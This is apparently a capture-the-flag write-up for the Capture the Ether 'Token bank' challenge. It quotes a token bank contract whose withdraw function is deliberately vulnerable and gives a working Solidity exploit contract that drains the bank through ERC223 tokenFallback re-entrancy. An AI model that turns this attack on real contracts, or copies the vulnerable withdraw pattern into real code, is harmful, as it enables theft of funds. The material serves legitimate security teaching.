# Token bank

## Challenge
Source: https://capturetheether.com/challenges/miscellaneous/token-bank/
>I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses ERC 223 to accept the incoming tokens.
>
>The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.

```
pragma solidity ^0.4.21;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes data) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping (address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function SimpleERC223Token() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function TokenBankChallenge(address player) public {
        token = new SimpleERC223Token();

        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10**18;  // half for me
        balanceOf[player] = 500000 * 10**18;      // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(this) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
    }
}
```
## Solution

This challenge involves a [re-entrancy attack](https://solidity.readthedocs.io/en/v0.4.24/security-considerations.html#re-entrancy). The only difference is that it achieves the re-entrancy using the [ERC 223](https://github.com/ethereum/EIPs/issues/223) ```tokenFallback``` function instead of the standard ```ether``` fallback function. The exploit can be achieved using Solidity:

```

pragma solidity ^0.4.24;

interface SimpleERC223Token {
    function transfer(address to, uint256 value) public returns (bool success);
    function transfer(address to, uint256 value, bytes data) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool success);
    function transferFrom(address from, address to, uint256 value) public returns (bool success);
}

contract ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes data) public;
}

contract TokenBankChallenge {
    function isComplete() public view returns (bool);
    function tokenFallback(address from, uint256 value, bytes) public;
    function withdraw(uint256 amount) public;
}

contract pirate is ITokenReceiver {
    address public from;
    uint public value;
    bytes data;
    // I used these two to figure out the contract flow
    uint256 public testFrom = 0;
    uint256 public testSender = 0;

    // this was to eliminate infinite recrusion within the fallback function
    uint256 public counter = 0;

    TokenBankChallenge public bank;
    SimpleERC223Token public token;
    // addrToken should be the SimpleERC223Token contract address
    address addrToken = 0xD51B6166dcA6e788F2727BF00698515cc1Fed7e2;
    // addrBank should be the TokenBankChallenge contract address
    address addrBank = 0x541bb3DDaeEec4d40AABF3D2Fcf84326324b6bE6;
    // owner of half the tokens
    address smarx = 0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee;
    // your half of the tokens, insert your address
    address attacker = 0x0000000000000000000000000000000000000000;

    constructor() public payable {
        bank = TokenBankChallenge(addrBank);
        token = SimpleERC223Token(addrToken);
    }

    function tokenFallback(address _from, uint _value, bytes _data) public {
        // allows for re-entrancy by receiving tokens from external contract
        from = _from;
        value = _value;
        data = _data;

        if(msg.sender == addrToken) {
            // true
            testSender = 1;
        }

        if(counter == 0) {
            if(_from == addrBank) {
                // true
                testFrom = 2;
                // counter only lets the recursion occur one time
                // this is to avoid infinite loop
                counter = 1;
                bank.withdraw(value);
            }
        }


    }

    function transfMem(address _to, uint256 _value) public {
        bytes memory empty;
        token.transfer(_to, _value, empty);
    }

    function withdrawAttack(uint256 _value) public {
        // 500000000000000000000000
        bank.withdraw(_value);
    }

}
```
